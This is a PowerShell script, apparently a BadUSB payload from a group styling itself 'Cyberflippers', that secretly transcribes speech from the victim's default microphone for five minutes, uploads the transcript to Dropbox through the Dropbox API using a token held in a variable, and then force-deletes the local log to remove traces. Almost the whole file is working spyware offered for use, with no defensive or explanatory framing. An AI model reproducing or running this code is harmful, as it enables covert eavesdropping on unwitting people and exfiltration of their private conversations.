<#
########################################################################################################################
#  __  __ _____      ______ _      _____ _____  _____  ______ _____  __  __ ______ _   _ 			      #
# |  \/  |  __ \    |  ____| |    |_   _|  __ \|  __ \|  ____|  __ \|  \/  |  ____| \ | |			      #
# | \  / | |__) |   | |__  | |      | | | |__) | |__) | |__  | |__) | \  / | |__  |  \| |			      #
# | |\/| |  _  /    |  __| | |      | | |  ___/|  ___/|  __| |  _  /| |\/| |  __| |     |			      #
# | |  | | | \ \ _  | |    | |____ _| |_| |    | |    | |____| | \ \| |  | | |____| |\  |			      #
# |_|  |_|_|  \_(_) |_|    |______|_____|_|    |_|    |______|_|  \_\_|  |_|______|_| \_|                             #
#    _______     ______  ______ _____  ______ _      _____ _____  _____  ______ _____   _____ 			      # 
#   / ____\ \   / /  _ \|  ____|  __ \|  ____| |    |_   _|  __ \|  __ \|  ____|  __ \ / ____|                        # 
#  | |     \ \_/ /| |_) | |__  | |__) | |__  | |      | | | |__) | |__) | |__  | |__) | (___                          # 
#  | |      \   / |  _ <|  __| |  _  /|  __| | |      | | |  ___/|  ___/|  __| |  _  / \___ \                         # 
#  | |____   | |  | |_) | |____| | \ \| |    | |____ _| |_| |    | |    | |____| | \ \ ____) |                        # 
#   \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/ 			      # 
 #########################################################################################################################           
#>
function DropBox-Upload {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [Alias("f")]
        [string]$RutaArchivoOrigen
    )
    $archivoSalida = Split-Path $RutaArchivoOrigen -leaf
    $RutaArchivoDestino = "/$archivoSalida"
    $arg = '{ "path": "' + $RutaArchivoDestino + '", "mode": "add", "autorename": true, "mute": false }'
    $autorizacion = "Bearer " + $db
    $cabeceras = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $cabeceras.Add("Authorization", $autorizacion)
    $cabeceras.Add("Dropbox-API-Arg", $arg)
    $cabeceras.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $RutaArchivoOrigen -Headers $cabeceras
}

function voiceLogger {
    param (
        [int]$duracionMinutos = 5
    )

    Add-Type -AssemblyName System.Speech
    $reconocedor = New-Object System.Speech.Recognition.SpeechRecognitionEngine
    $gramatica = New-Object System.Speech.Recognition.DictationGrammar
    $reconocedor.LoadGrammar($gramatica)
    $reconocedor.SetInputToDefaultAudioDevice()

    $log = "$env:TMP\VoiceLog.txt"
    $horaInicio = Get-Date

    while ((Get-Date) -lt $horaInicio.AddMinutes($duracionMinutos)) {
        $resultado = $reconocedor.Recognize()
        if ($resultado) {
            $resultados = $resultado.Text
            Write-Output $resultados
            Add-Content $log -Value $resultados
        }
    }

    # Subir el archivo a Dropbox
    if (-not ([string]::IsNullOrEmpty($db))) {
        DropBox-Upload -RutaArchivoOrigen $log
    }

    # Borrar el archivo de registro
    Remove-Item $log -Force
}

# Llamar a la función voiceLogger con la duración en minutos deseada
voiceLogger -duracionMinutos 5
